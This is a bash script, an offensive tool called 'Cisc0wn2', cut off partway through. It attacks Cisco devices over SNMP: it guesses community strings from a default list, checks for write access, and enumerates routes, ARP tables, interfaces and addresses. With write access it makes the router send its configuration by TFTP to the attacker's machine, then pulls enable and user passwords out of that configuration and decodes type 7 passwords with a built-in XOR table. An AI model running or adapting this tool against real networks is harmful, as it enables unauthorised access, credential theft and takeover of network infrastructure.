#!/bin/bash
# Cisc0wn2 - The Cisco SNMP 0wner.
# Daniel Compton
# www.commonexploits.com
# contact@commexploits.com
# Twitter = @commonexploits
# 01/05/2015
# Requires atftpd, snmpwalk, snmpset, screen - suggest Kali Linux as all installed by default
#  Now uses snmpwalk/snmpset for all functions, no requirement on using Metasploit. Lots of code rewrite and fixes applied.

# Default SNMP Community strings to check for if not user strings supplied. If editing add in between both EOT tags, but do not remove EOT.
strings() {
cat <<"EOT"
public
private
Public
Private
system
manager
cacti
monitor
EOT
}

# Text colour index
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
BLUE=$(tput setaf 4)
MAGENTA=$(tput setaf 5)
CYAN=$(tput setaf 6)
BRIGHT=$(tput bold)
NORMAL=$(tput sgr0)

# user config settings
COM_PASS="strings.tmp" #ocation of snmp communities to try
OPATH=$(pwd)
OUTPUTDIR=$(printf "%s\n" "${OPATH}/")
TFTPOUTPUTDIR="/tmp/"
SNMPVER="2c" #2c or change to 1
PORT="161" #default snmp port

# Script begins
#===============================================================================
clear

VERSION="2.0"

banner() {
tput setaf 4; tput bold sgr0; cat <<"EOT"

		   ___  _              ___                   
		  / __\(_) ___   ___  / _ \ __      __ _ __  
		 / /   | |/ __| / __|| | | |\ \ /\ / /| '_ \ 
		/ /___ | |\__ \| (__ | |_| | \ V  V / | | | |
		\____/ |_||___/ \___| \___/   \_/\_/  |_| |_|
														
EOT
}


#Dependency checking
checkdepend() {

#Check for snmpwalk
which snmpwalk >/dev/null
if [ $? -eq 1 ]
	then
		printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "Unable to find the required snmpwalk program, install and try again${NORMAL}"
        exit 1
fi

#Check for snmpset
which snmpset >/dev/null
if [ $? -eq 1 ]
	then
		printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "Unable to find the required snmpset program, install and try again${NORMAL}"
        exit 1
fi

#Check for screen
which screen >/dev/null
if [ $? -eq 1 ]
	then
		printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "Unable to find the required screen program, install and try again${NORMAL}"
        exit 1
fi

#Check for atftpd
which atftpd >/dev/null
if [ $? -eq 1 ]
	then
		printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "Unable to find the required atftpd program, install and try again${NORMAL}"
        exit 1
fi
}

#clear

# script starts do not alter
#_________________________________________________________________________________________________________________________________________________________

# Cisco OIDs used
# Routing Info
ROUTEOID=".1.3.6.1.2.1.4.21.1.1"
ROUTDESTOID=".1.3.6.1.2.1.4.21.1.1" # Destination
ROUTHOPOID=".1.3.6.1.2.1.4.21.1.7" # Next Hop
ROUTMASKOID=".1.3.6.1.2.1.4.21.1.11" # Mask
ROUTMETOID=".1.3.6.1.2.1.4.21.1.3" # Metric
ROUTINTOID=".1.3.6.1.2.1.4.21.1.2" # Interface
ROUTTYPOID=".1.3.6.1.2.1.4.21.1.8" # Route type
ROUTPROTOID=".1.3.6.1.2.1.4.21.1.9" # Route protocol
ROUTAGEOID=".1.3.6.1.2.1.4.21.1.10" # Route age
#Interface Info
INTLISTOID=".1.3.6.1.2.1.2.2.1.2" # Interfaces
INTIPLISTOID=".1.3.6.1.2.1.4.20.1.1" # IP address
INTIPMASKOID=".1.3.6.1.2.1.4.20.1.3" # Subnet mask
INTSTATUSLISTOID=".1.3.6.1.2.1.2.2.1.8" # Status
# Arp table
ARPADDR=".1.3.6.1.2.1.3.1 " # Arp address
WRITEOID=".1.3.6.1.2.1.1.4.0"
CONTACTOID=".1.3.6.1.2.1.1.4.0"
HOSTNAMEOID=".1.3.6.1.2.1.1.5.0"
ARPOID=".1.3.6.1.2.1.3.1.1.2"
TFTPOID=".1.3.6.1.4.1.9.2.1.55." #Cisco TFTP OID for config download
STRINGSP="strings" # strings if list supplied, string if -s option used

spinner()
{
local pid=$1
local delay=0.175
local spinstr='|/-\'
local infotext=$2
while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
local temp=${spinstr#?}
printf ${BRIGHT}${GREEN}"[%c]${NORMAL} %s" "$spinstr" "$infotext"
local spinstr=$temp${spinstr%"$temp"}
sleep $delay
printf "\b\b\b\b\b\b"
for i in $(seq 1 ${#infotext}); do
printf "\b"
done
done
printf " \b\b\b\b"
}

ipscan() {
printf '\n\r%s\n' "${BRIGHT}${RED}----------------------------------------------------------"
printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the IP address of the Cisco device to scan"
printf '\r%s\n\n' "${BRIGHT}${RED}----------------------------------------------------------${NORMAL}"
read CISCOIP
printf '\r\n%s %s \n' "${BRIGHT}${GREEN}[-]${NORMAL}" "Just checking that SNMP is open and accessible from this system."
}

# If have Internet access check if Cisc0wn is the latest release
compare_version() {
printf '\r\n%s \n' "${BRIGHT}${BLUE}[i]${NORMAL} Checking for Internet connectivity"
ping 8.8.8.8 -c 1 > /dev/null 2>&1
			if [ $? = 0 ]
				then
					printf '\r\n%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} Internet connectivity confirmed, now checking the version."
					NEWVERSION=$(curl -s "http://www.commonexploits.com/tools/cisc0wn/version.txt" 2>/dev/null |cut -d "." -f 1,2)
					CHKVERSION=$(echo "$VERSION < $NEWVERSION"| bc)
					if [ $CHKVERSION -eq 1 ]
						then
							printf '\n \r%s %s\n\n' "${BRIGHT}${YELLOW}[!]${NORMAL} Your version of Cisc0wn is outdated. Please update to version ${BRIGHT}${GREEN}$NEWVERSION${NORMAL}"
							printf '\r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Download the latest version from ${BRIGHT}${BLUE}https://github.com/commonexploits/cisc0wn${NORMAL}"
						else
							printf '\n \r%s %s\n\n' "${BRIGHT}${GREEN}[+]${NORMAL} Your version of Cisc0wn is the latest version ${BRIGHT}${GREEN}$NEWVERSION${NORMAL}"
					fi
				else
					printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} You do not seem to have an Internet connection, unable to check the version."
					exit 0
			fi	
}

# menu options
tags () { 
printf '\r\n%s\n\n' "${BRIGHT}${RED}[?]${NORMAL} Script flag options"
printf '\r%s\n' "${BRIGHT}${BLUE}-f${NORMAL}		Enter file name containing SNMP strings (1 per line)"
printf '\r%s\n' "${BRIGHT}${BLUE}-s${NORMAL}		Enter one single SNMP community to scan for"
printf '\r%s\n' "${BRIGHT}${BLUE}-i${NORMAL}		Enter IP address of device to scan"
printf '\r%s\n' "${BRIGHT}${BLUE}-v${NORMAL}		Version - check if latest version - Internet access required"
printf '\r%s\n\n' "${BRIGHT}${BLUE}-h${NORMAL}		Displays this help menu"
printf '\r%s\n\n' "Default scan runs with built in SNMP Communities and prompt for IP info"
}


pause(){
	printf '\n'
    read -p "Press [Enter] key to continue." fackEnterKey
	printf '\n'
}




# Perl Base64 decoder
perldecode() {
perl <<'EOF'

use Term::ANSIColor;
@xlat = ( 0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41,
          0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c,
          0x64, 0x4a, 0x4b, 0x44, 0x48, 0x53 , 0x55, 0x42 );



                if (!(length($ENV{BASE64}) & 1)) {
                        $ep = $ENV{BASE64};
                        $dpassenable = "";
                        ($s, $e) = ($ep =~ /^(..)(.+)/);
                        for ($i = 0; $i < length($e); $i+=2){
                                $dpassenable .= sprintf "%c",hex(substr($e,$i,2))^$xlat[$s++];
                        }
                }
				
				print color 'bold green';
				print "$dpassenable\n\n";
				print color 'reset';
EOF

}

# nmap to check SNMP is open
nmapsnmp() {
NMAP=`nmap -sU -sV -p $PORT $CISCOIP 2>&1 |grep "open" | awk '{ print $2 }'`
if [ "$NMAP" = "open" ]
	then
		printf '\r\n%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "SNMP was found enabled on ${BRIGHT}${GREEN}"$CISCOIP"${NORMAL}"
	else
		printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "SNMP is either closed or filtered from this device. Check connectivity and try again. Script can't continue."
		exit 1
fi
}

# SNMP community string checks
scansnmpcom() {
COMNO=$(cat "$COM_PASS" | wc -l)
printf '\r\n%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now testing SNMP communities with ${BRIGHT}${GREEN}"$COMNO"${NORMAL} $STRINGSP."

snmpcheckrw() {
			echo "$GETLOCATION" >location.tmp
			WRILOC=$(cat location.tmp)
			snmpset -v 2c -Cq -c "$COMSCAN" $CISCOIP "$WRITEOID" s "$WRILOC" 2>/dev/null
			if [ $? = 0 ]
				then
					printf '%s\n' " - ${BRIGHT}${RED}Read-Write${NORMAL} access"
					READW="$COMSCAN"
				else
					printf '%s\n' " - ${BRIGHT}${YELLOW}Read-Only${NORMAL} access"
					READO="$COMSCAN"
			fi
}
for COMSCAN in $(cat $COM_PASS)
do
	snmpwalk -v 2c -c $COMSCAN $CISCOIP 2>/dev/null |head -1 |grep -i iso >/dev/null
	if [ $? = 0 ]
		then
			printf '\r%s %s' "${BRIGHT}${GREEN}[+]${NORMAL}" "Valid Community String was found ${BRIGHT}${GREEN}"$COMSCAN"${NORMAL}" ;snmpcheckrw
			GETLOCATION=$(snmpwalk -v 2c -On -c "$COMSCAN" $CISCOIP |grep "$WRITEOID" |cut -d ":" -f 2 | cut -d '"' -f 2)

	fi
done
}

# show version/info
printf '\n \r%s %s\n' "${BRIGHT}${BLUE}--------------------------------------------------------------------------------------- ${NORMAL}"
banner
printf '\n \r%s %s\n' "${BRIGHT}${BLUE} 	    --- Cisc0wn - The Cisco SNMP Extractor Version $VERSION --- ${NORMAL}"
printf '\n \r%s %s\n' "${BRIGHT}${BLUE}-------------------------------------------------------------------------------------- ${NORMAL}"
printf '\n \r%s %s\n' "${BRIGHT}${BLUE}./cisc0wn2.sh -h for help menu for command line options. ${NORMAL}"
printf '\n \r%s %s\n' "${BRIGHT}${BLUE}If no options are supplied, it will run in default mode with built in SNMP strings. ${NORMAL}"
printf '\n \r%s %s\n' "${BRIGHT}${BLUE}-------------------------------------------------------------------------------------- ${NORMAL}"

#check dependencies
checkdepend

# show menu

while getopts "f:s:i:vh" menu
do
 case "${menu}" in
	  f) filename=${OPTARG};;
	  s) inputstring=${OPTARG};;
	  i) inputip=${OPTARG};;
	  v) compare_version; exit;;
	  h) tags; exit;;
	  *) tags; exit;;
 esac
done

if [ "$filename" ] && [ "$inputstring" ]
then
	printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "Sorry you have supplied both a manual string and a file of strings, please only supply one of these options and try again!${NORMAL}"
	exit 1

elif [ "$filename" ]
	then 
		COM_PASS="$filename"
		cat $filename >/dev/null 2>&1
			if [ $? = 1 ]
				then
					printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "Sorry I can't read that file, check the path and try again!${NORMAL}"
					exit 1
				else
					READFILESTRINGS=$(cat $filename |wc -l)
					printf '\r\n%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "I can read ${BRIGHT}${GREEN}"$READFILESTRINGS"${NORMAL} community strings from the input file ${BRIGHT}${GREEN}"$COM_PASS"${NORMAL}"
					STRINGSP="user defined strings"
			fi
elif [ "$inputstring" ]
	then
		echo "$inputstring" > "$COM_PASS"
		STRINGSP="user defined string"

else 
	strings > "$COM_PASS"
	STRINGSP="default strings"
fi

if [ "$inputip" ]
	then 
		CISCOIP="$inputip"
	else
		ipscan
fi

#check snmp is open
nmapsnmp
#scan for snmp communities
scansnmpcom 

if [[ -z "$READO" && -z "$READW" ]]
	then
		printf '\r\n%s \n\n' "${BRIGHT}${RED}[!]${NORMAL} No SNMP community string matches were found. Try increasing the community strings to check for."
		exit 1
fi

if [ -z "$READO" ]
	then
		printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} I will use the writeable string of ${BRIGHT}${GREEN}"$READW"${NORMAL} as no read only community was found."
		ENUMCOM=`echo "$READW"`
	else
		ENUMCOM=`echo "$READO"`
fi
	
printf '\r\n%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "Extracting information from ${BRIGHT}${GREEN}"$CISCOIP"${NORMAL} using the community string ${BRIGHT}${GREEN}"$ENUMCOM"${NORMAL}."

# IOS version Extract
iossearch() {
IOS=$(snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP |grep "RELEASE SOFTWARE" | awk '{ print $0 }' |awk '{sub(/^[ \t]+/, ""); print}')
if [ -n "$IOS" ]
	then
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} IOS version Obtained          "
		printf '\r %s \n\n' "${BRIGHT}${GREEN}$IOS${NORMAL}"
fi
}
#printf '\r%s \n\n' "${BRIGHT}${GREEN}[-]${NORMAL} Searching for IOS Version"
iossearch &
spinner $! "Searching for IOS Version"

# CONTACT Info
contactsearch() {
CONTACT=$(snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $CONTACTOID | grep iso | cut -d '"' -f 2)
if [ -n "$CONTACT" ]
	then
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} SNMP Contact Obtained         "
		printf '\r %s \n\n' "${BRIGHT}${GREEN}$CONTACT${NORMAL}"
fi
}
contactsearch &
spinner $! "Searching for IOS Version"

# Device Hostname
hostnamesearch() {
HOSTNAME=$(snmpwalk -c $ENUMCOM -On -v$SNMPVER $CISCOIP |grep $HOSTNAMEOID |cut -d ":" -f 2 | cut -d '"' -f 2)
if [ -n "$HOSTNAME" ]
	then
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} Device Hostname Obtained          "
		printf '\r %s \n\n' "${BRIGHT}${GREEN}$HOSTNAME${NORMAL}"
fi
}
hostnamesearch &
spinner $! "Searching for Device Hostname"
pause
clear

routingsearch() {
ANYROUTES=$(snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTEOID | awk '{print $NF}' 2>&1)
if [ "$ANYROUTES" = "OID" ]
	then
		printf '\n'
		printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} No routing tables found, this is probably a Layer 2 device."
	else
		# routing table format headers
		echo "-------------------" >"$OUTPUTDIR"ROUTDEST
		echo "Destination" >>"$OUTPUTDIR"ROUTDEST
		echo "-------------------">>"$OUTPUTDIR"ROUTDEST

		echo "-----------------" >"$OUTPUTDIR"ROUTHOP
		echo "Next_Hop" >>"$OUTPUTDIR"ROUTHOP
		echo "-----------------">>"$OUTPUTDIR"ROUTHOP

		echo "---------------" >"$OUTPUTDIR"ROUTMASK
		echo "Mask" >>"$OUTPUTDIR"ROUTMASK
		echo "---------------">>"$OUTPUTDIR"ROUTMASK

		echo "-----------" >"$OUTPUTDIR"ROUTMET
		echo "Metric" >>"$OUTPUTDIR"ROUTMET
		echo "-----------">>"$OUTPUTDIR"ROUTMET

		echo "-----------" >"$OUTPUTDIR"ROUTINT
		echo "Interface" >>"$OUTPUTDIR"ROUTINT
		echo "-----------">>"$OUTPUTDIR"ROUTINT

		echo "-----------" >"$OUTPUTDIR"ROUTTYP
		echo "Type" >>"$OUTPUTDIR"ROUTTYP
		echo "-----------">>"$OUTPUTDIR"ROUTTYP

		echo "----------" >"$OUTPUTDIR"ROUTPROT
		echo "Protocol" >>"$OUTPUTDIR"ROUTPROT
		echo "----------">>"$OUTPUTDIR"ROUTPROT

		echo "--------" >"$OUTPUTDIR"ROUTAGE
		echo "Age" >>"$OUTPUTDIR"ROUTAGE
		echo "--------">>"$OUTPUTDIR"ROUTAGE

		#snmp walk the routing table OIDs into temp files
		snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTDESTOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTDEST
		snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTHOPOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTHOP
		snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTMASKOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTMASK
		snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTMETOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTMET
		snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTINTOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTINT
		snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTTYPOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTTYP
		snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTPROTOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTPROT
		snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTAGEOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTAGE

		paste "$OUTPUTDIR"ROUTDEST "$OUTPUTDIR"ROUTHOP "$OUTPUTDIR"ROUTMASK "$OUTPUTDIR"ROUTMET "$OUTPUTDIR"ROUTINT "$OUTPUTDIR"ROUTTYP "$OUTPUTDIR"ROUTPROT "$OUTPUTDIR"ROUTAGE |column -t 2>&1 >"$OUTPUTDIR$CISCOIP"-routes.txt
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} Routing Tables Extracted    "
		cat "$OUTPUTDIR$CISCOIP"-routes.txt
		printf '\n'
		#remove temp files
		rm "$OUTPUTDIR"ROUT* 2>&1 >/dev/null
		printf '\r%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} The routing table has also been saved to the following location ${BRIGHT}${BLUE}$OUTPUTDIR$CISCOIP-routes.txt${NORMAL}"
fi

}
printf '\n'
routingsearch &
spinner $! "Searching for Routing Tables"

arpsearch () {
# arp table walk
ARPIPADDRESSCHECK=$(snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ARPOID | cut -d ':' -f 1 |cut -d "." -f 13,14,15,16 |awk '{print $1}' 2>&1) 
ARPMACADDRESSCHECK=$(snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ARPOID | cut -d ':' -f 2 |awk '{sub(/^[ \t]+/, ""); print}' |cut -d ':' -f 1 |tr ' ' ':' |sed 's/:$//' 2>&1)
if [ -n "$ARPIPADDRESSCHECK" ] && [ -n "$ARPMACADDRESSCHECK" ]
	then
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} ARP Table Obtained          "
		# Arp table headers
		echo "------------------" >"$OUTPUTDIR"ARPADDRESS
		echo "IP_Address        " >>"$OUTPUTDIR"ARPADDRESS
		echo "------------------" >>"$OUTPUTDIR"ARPADDRESS
		echo "$ARPIPADDRESSCHECK" >>"$OUTPUTDIR"ARPADDRESS
		echo "-------------------------" >"$OUTPUTDIR"ARPDARDWARE
		echo "Physical_Address         " >>"$OUTPUTDIR"ARPDARDWARE
		echo "-------------------------" >>"$OUTPUTDIR"ARPDARDWARE
		echo "$ARPMACADDRESSCHECK" >>"$OUTPUTDIR"ARPDARDWARE
		paste "$OUTPUTDIR"ARPADDRESS "$OUTPUTDIR"ARPDARDWARE |column -t 2>&1 >"$OUTPUTDIR$CISCOIP"-arptable.txt
		cat "$OUTPUTDIR$CISCOIP"-arptable.txt
		#remove temp files
		rm "$OUTPUTDIR"ARP* 2>&1 >/dev/null
		printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} The arp table has also been saved to the following location ${BRIGHT}${BLUE}$OUTPUTDIR$CISCOIP-arptable.txt${NORMAL}"
fi
}

arpsearch &
spinner $! "Searching for ARP Tables"

interfacesearch() {
#snmp walk the interface OIDs into temp files
INTERFACELISTCHECK=$(snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $INTLISTOID | awk '{print $NF}'|cut -d '"' -f 2 2>&1)
INTERFACESTATUSCHECK=$(snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $INTSTATUSLISTOID | awk '{print $NF}' |sed -e "s/1/Up/g" |sed -e "s/[2-9]/Down/g" 2>&1)
if [ -n "$INTERFACELISTCHECK" ]
	then
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} Interface List Obtained           "
		# Interface header info
		echo "-------------------" >"$OUTPUTDIR"INTLIST
		echo "Interface" >>"$OUTPUTDIR"INTLIST
		echo "-------------------">>"$OUTPUTDIR"INTLIST
		echo "$INTERFACELISTCHECK" >>"$OUTPUTDIR"INTLIST
		echo "-----------" >"$OUTPUTDIR"INTSTATUSLIST
		echo "Status" >>"$OUTPUTDIR"INTSTATUSLIST
		echo "-----------">>"$OUTPUTDIR"INTSTATUSLIST
		echo "$INTERFACESTATUSCHECK" >>"$OUTPUTDIR"INTSTATUSLIST
		paste "$OUTPUTDIR"INTLIST "$OUTPUTDIR"INTSTATUSLIST |column -t 2>&1 >"$OUTPUTDIR$CISCOIP"-interfaces.txt
		cat "$OUTPUTDIR$CISCOIP"-interfaces.txt
		printf '\n'
		#remove temp files
		rm "$OUTPUTDIR"INT* 2>&1 >/dev/null
		printf '\r%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} The interface list has also been saved to the following location ${BRIGHT}${BLUE}"$OUTPUTDIR$CISCOIP"-interfaces.txt${NORMAL}"
fi
}

interfacesearch &
spinner $! "Searching for Interface information"

ipaddresssearch () {
#snmp walk the IP Addresses OIDs into temp files
IPADDRESSCHECK=$(snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $INTIPLISTOID | awk '{print $NF}' 2>&1)
IPADDRESSSUBNETCHECK=$(snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $INTIPMASKOID | awk '{print $NF}' 2>&1)

if [ -n "$IPADDRESSCHECK" ] && [ -n "$IPADDRESSSUBNETCHECK" ]
	then
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} IP Address Information Obtained       "
		echo "-----------------" >"$OUTPUTDIR"IPLIST
		echo "IP_Address" >>"$OUTPUTDIR"IPLIST
		echo "-----------------">>"$OUTPUTDIR"IPLIST
		echo "$IPADDRESSCHECK" >>"$OUTPUTDIR"IPLIST
		echo "---------------" >"$OUTPUTDIR"IPMASK
		echo "Subnet_Mask" >>"$OUTPUTDIR"IPMASK
		echo "---------------">>"$OUTPUTDIR"IPMASK
		echo "$IPADDRESSSUBNETCHECK" >>"$OUTPUTDIR"IPMASK
		paste "$OUTPUTDIR"IPLIST "$OUTPUTDIR"IPMASK |column -t 2>&1 >"$OUTPUTDIR$CISCOIP"-iplist.txt
		cat "$OUTPUTDIR$CISCOIP"-iplist.txt
		printf '\n'
		#remove temp files
		rm "$OUTPUTDIR"IP* 2>&1 >/dev/null
		printf '\r%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} The IP address list has also been saved to the following location ${BRIGHT}${BLUE}"$OUTPUTDIR$CISCOIP"-iplist.txt${NORMAL}"
fi
}
ipaddresssearch &
spinner $! "Searching for IP Address information"

# config download check if have write community string
checkrwtftp() {
echo "$READW" >/dev/null
if [ -z "$READW" ]
	then
		printf '\r%s \n\n' "${BRIGHT}${RED}[!]${NORMAL} I will not be able to attempt to download the config, as I didn't find any writeable community string earlier."
		printf '\r%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Script will now exit as I have done all I can with read only access"
		exit 1
	else
		printf '\r%s \n' "${BRIGHT}${BLUE}[i]${NORMAL} As a writeable SNMP community string of ${BRIGHT}${GREEN}"$READW"${NORMAL} was found, an attempt will be made to download the config file"
		pause
		clear
		
fi

}

# list source Ethernet interfaces to scan from
sourceinterfaces() {
printf '\n\r%s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} The following Interfaces are available"
ip addr show |grep -v LOOPBACK |grep qlen  | cut -d ':' -f 2 |awk '{sub(/^[ \t]+/, ""); print}'
printf '\n\r%s\n' "${BRIGHT}${RED}----------------------------------------------------------"
printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the local interface to use:"
printf '\r%s\n\n' "${BRIGHT}${RED}----------------------------------------------------------${NORMAL}"
read MYINT

CHECKMYINT=$(ip addr show |grep -v LOOPBACK |grep qlen  | cut -d ':' -f 2 |awk '{sub(/^[ \t]+/, ""); print}'| grep -i -w  "$MYINT")
if [ "$CHECKMYINT" != "$MYINT" ]
        then
			   printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "Sorry the interface you entered does not exist! - check and try again."
               exit 0
		else
				LOCALIP=$(ip addr |grep "$MYINT" |grep "inet" |cut -d "." -f 1,2,3,4 |cut -d "/" -f 1 | cut -d "t" -f 2 |awk '{sub(/^[ \t]+/, ""); print}')
				if [ -z "$LOCALIP" ]
					then
						printf '\r\n%s \n\n' "${BRIGHT}${RED}[!]${NORMAL} ${BRIGHT}${GREEN}"$MYINT"${NORMAL} has no IP Address set, please select an interface that has an IP Address configured"
						pause
						sourceinterfaces
					else
						printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} I will use your IP address of ${BRIGHT}${BLUE}"$LOCALIP"${NORMAL} on ${BRIGHT}${BLUE}"$MYINT"${NORMAL} to TFTP the config"
				fi
fi
printf '\n'

}
pause
clear
sourceinterfaces
pause
checkrwtftp

#start TFTP server
printf '\r\n%s \n' "${BRIGHT}${BLUE}[i]${NORMAL} Starting local TFTP server to listen for the config file"

atftpd -v --port 69 --daemon --bind-address "$LOCALIP" "$TFTPOUTPUTDIR" 2>/dev/null
if [ $? = 0 ]
	then
		printf '\r\n%s \n' "${BRIGHT}${GREEN}[+]${NORMAL} TFTP started successfully."
	
	else
		printf '\r\n%s \n' "${BRIGHT}${RED}[!]${NORMAL} Error unable to start TFTP server."
		exit 0
fi

printf '\n\n'
# Attempt to download Cisco config via TFTP
snmpset -Cq -r 2 -t 5 -v $SNMPVER -c $READW $CISCOIP $TFTPOID$LOCALIP s $CISCOIP.txt 2>/dev/null &
SECONDS=0;
while sleep .5 && ((SECONDS <= 10))
	do
		printf '\r%s %s %1d %s' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now attempting to download the router config file, waiting for " "$((10-SECONDS))" "seconds."
	done
printf '\n\n'

cat "$TFTPOUTPUTDIR$CISCOIP.txt" >/dev/null 2>&1
if [ $? = 1 ]
	then
		printf '\r\n%s \n' "${BRIGHT}${RED}[!]${NORMAL} There was a problem I couldn't TFTP download the config. Check your IP and firewall settings and try again. If using a VM ensure it is in bridged mode and not NAT"
		killall atftpd 2>/dev/null
		printf '\r\n%s \n' "${BRIGHT}${BLUE}[!]${NORMAL} Stopping local TFTP server."
		exit 1
	else
		mv "$TFTPOUTPUTDIR$CISCOIP.txt" "$OUTPUTDIR$CISCOIP-router-config.txt"
		printf '\r%s \n' "${BRIGHT}${GREEN}[+]${NORMAL} Success. Cisco config was downloaded to the following location ${BRIGHT}${BLUE}$OUTPUTDIR$CISCOIP-router-config.txt${NORMAL}"
		printf '\r\n%s \n' "${BRIGHT}${BLUE}[i]${NORMAL} Stopping local TFTP server."
		killall atftpd 2>/dev/null
		pause
fi

# look for encoded or clear text enable passwords
clearenable() {
CLEARENABLECHECK=$(cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "enable password 7" 2>&1)
if [ -n "$CLEARENABLECHECK" ]
	then
		ENPW7=$(cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "enable password 7" |awk '{print $NF}' 2>&1)
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} Service password-encryption is enabled. The enable encoded type 7 password string is"
		printf '\r%s \n\n' "${BRIGHT}${GREEN}"$ENPW7"${NORMAL}"
		printf '\r\%s \n' "$ENPW7" >"$OUTPUTDIR$CISCOIP-ciscoenable7pw.txt"
		BASE64="$ENPW7"
		export BASE64
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} The decoded enable type 7 password is"
		# Run perl base64 decode function
		perldecode
	else
		printf '\r%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} It seems that that no encoded enable 7 password is set"
fi

CLRENABLE=$(cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "enable password" | awk '{print $3}' 2>&1)
if [ -z "$CLRENABLE" ]
	then
		printf '\r%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} I didn't find any clear text enable passwords set"
elif [ "$CLRENABLE" != "7" ]
	then
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} Clear Text Enable password was found"
		printf '\r%s \n\n' "${BRIGHT}${GREEN}"$CLRENABLE"${NORMAL}"
fi
}
clearenable


# look for local users with encoded passwords - if 1 user decode it, it >1 then just list them (will update to loop and decode them all soon).

localencoded() {
ENLOCAL7ONE=$(cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "username" |grep "password 7" |wc -l 2>&1)
if [ $ENLOCAL7ONE -gt 1 ]
	then
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} The following local users with type 7 encoded passwords were found. I am unable to decode more than 1 password, please use Cain & Abel or tools to decode the passwords"
		ENLOCAL7ONELIST=$(cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "username" |grep "password 7" 2>&1)
		printf '\r%s \n' "$ENLOCAL7ONELIST" >"$OUTPUTDIR$CISCOIP-ciscolocalusers7pw.txt"
		cat $OUTPUTDIR$CISCOIP-ciscolocalusers7pw.txt 2>&1
		printf '\n'
elif [ $ENLOCAL7ONE -eq 1 ]
	then
		ENLOCAL7=$(cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "username" |grep "password 7" |awk '{print $2}' 2>&1)
